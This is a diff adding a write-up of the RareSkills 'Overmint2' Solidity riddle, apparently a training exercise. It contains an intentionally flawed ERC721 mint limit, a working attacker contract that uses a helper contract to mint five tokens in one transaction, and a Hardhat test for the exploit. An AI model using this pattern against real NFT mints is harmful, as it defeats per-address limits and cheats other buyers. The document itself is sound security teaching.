@@ -887,3 +887,122 @@ describe(NAME, function () {
     });
 });
 ```
+
+## RareSkills Riddles - Overmint2
+
+### Contract
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity 0.8.15;
+import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
+
+contract Overmint2 is ERC721 {
+    using Address for address;
+    uint256 public totalSupply;
+
+    constructor() ERC721("Overmint2", "AT") {}
+
+    function mint() external {
+        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
+        totalSupply++;
+        _mint(msg.sender, totalSupply);
+    }
+
+    function success() external view returns (bool) {
+        return balanceOf(msg.sender) == 5;
+    }
+}
+```
+
+### Exploit
+
+In a public mint, people can generally mint as many NFTs as they want to, either by minting over and over or by colluding with other buyers. The only challenge here is that we have to mint 5 tokens _in a single transaction_.
+
+First, notice that the `mint` function's `require` prevents us from minting 5 tokens to a single address - it only allows us to mint 4. Based on the short error message, it's hard to say if the intention was to cap the mint at 3 or 4. In any case, the above implementation allows us to mint a total of 4 tokens to an attacker contract by calling `mint` multiple times via a for-loop.
+
+However, this is not yet enough to solve the riddle. To mint the fifth NFT, we can make use of an accomplice/minion contract that mints the remaining NFT for us.
+
+To ensure all these steps happen within a single transaction (the deployment transaction), we have to execute all of these steps inside the constructor of our attacker. Also, notice that our attacker and minion contracts have to send the tokens to the EOA that initiated the attack for the test suite to confirm that the exploit has been successful.
+
+_Overmint2Attacker.sol_
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity 0.8.15;
+
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import "./Overmint2.sol";
+
+contract Minion {
+    Overmint2 public overmint2;
+
+    constructor(address _overmint2Address) {
+        overmint2 = Overmint2(_overmint2Address);
+    }
+
+    function attack() public {
+        overmint2.mint();
+        overmint2.transferFrom(address(this), tx.origin, 5);
+    }
+}
+
+contract Overmint2Attacker {
+    Overmint2 public overmint2;
+
+    constructor(address _overmint2Address) {
+        overmint2 = Overmint2(_overmint2Address);
+        Minion minion = new Minion(_overmint2Address);
+
+        for (uint256 i; i < 4; i++) {
+            overmint2.mint();
+        }
+
+        for (uint256 i = 1; i < 5; i++) {
+            overmint2.transferFrom(address(this), msg.sender, i);
+        }
+
+        minion.attack();
+    }
+}
+```
+
+_Overmint2.js_
+```javascript
+const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
+const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
+
+const NAME = "Overmint2";
+
+describe(NAME, function () {
+    async function setup() {
+        const [owner, attackerWallet] = await ethers.getSigners();
+
+        const VictimFactory = await ethers.getContractFactory(NAME);
+        const victimContract = await VictimFactory.deploy();
+
+        return { victimContract, attackerWallet };
+    }
+
+    describe("exploit", async function () {
+        let victimContract, attackerWallet;
+        before(async function () {
+            ({ victimContract, attackerWallet } = await loadFixture(setup));
+        });
+
+        it("conduct your attack here", async function () {
+            const AttackerFactory = await ethers.getContractFactory("Overmint2Attacker");
+            const attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);
+        });
+
+        after(async function () {
+            expect(await victimContract.balanceOf(attackerWallet.address)).to.be.equal(5);
+            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.equal(
+                1,
+                "must exploit one transaction"
+            );
+        });
+    });
+});
+```
